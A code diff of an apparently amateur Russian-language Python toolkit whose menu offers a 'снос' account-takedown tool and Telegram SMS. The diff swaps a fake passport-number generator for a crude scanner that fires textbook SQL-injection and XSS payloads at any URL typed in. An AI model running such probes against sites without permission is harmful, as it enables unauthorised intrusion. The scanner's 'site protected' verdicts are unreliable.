@@ -7,7 +7,7 @@ import colorama
 from colorama import Fore, Back, Style
 import os
 from art import tprint
-from threading import Thread
+
 
 headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}
 colorama.init()
@@ -36,6 +36,8 @@ print (Fore.YELLOW + "")
 time.sleep(1)
 
 
+
+
     
 
                 
@@ -51,14 +53,34 @@ def gen():
     
 
 def gp():
-    kol = input("Количество:")
-    time.sleep(1)
-    print ("Generate...")
-    for p in range(int(kol)):
-        gen = random.randint(2222, 9999)
-        gen1 = random.randint(111111, 999999)
-        print (gen, gen1)
-    time.sleep(215)
+    print (Fore.GREEN + '')
+    
+    target_url = input("Введите URL сайта для проверки: ")
+    
+    payloads_sql = ["' OR '1'='1", '" OR "1"="1']
+    
+    payloads_xss = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
+    
+    for payload in payloads_sql:
+        response = requests.get(f"{target_url}?id={payload}")
+        if "error" in response.text.lower() or "mysql" in response.text.lower():
+            print (Fore.RED + '')
+            print(f"SQL-инъекция найдена: {response.url}")
+        else:
+            print (Fore.YELLOW + '')
+            print ('SQL не найден! +++ Сайт защищён!')
+    time.sleep(62)
+
+    for payload in payloads_xss:
+        response = requests.get(f"{target_url}?search={payload}")
+        if payload in response.text:
+            print (Fore.RED + '')
+            print(f"XSS уязвимость найдена: {response.url}")
+        else:
+            print (Fore.YELLOW + '')
+            print ('XSS не найден! +++Сайт защищён!')
+    time.sleep(62)
+            
     
 
 def snos():
@@ -92,16 +114,17 @@ def sms():
     
     
 
-
-print ("_____________________________________________")
+print (Fore.CYAN +  'Telegramm: @exitbaza')
+print (Fore.YELLOW +  "_____________________________________________")
 print ("|  1. Поиск каталогов сайта                                           ")
 print ("|  2. Генератор Номеров                               ")
 print ("|  3. Общение с users через бота тг             ")
-print ("|  4. Генератор Серии/ Номера паспорта   ")
+print ("|  4. Поиск SQL уязвимостей   ")
 print ("|  5. Сносер                                                      ")
 print ("|  6. Смс  telegramm")
 print ("|  0. Выход                                                      ")
 print ("---------------------------------------------")
+
 
 print ("")
 user = input("Введите номер действия>")
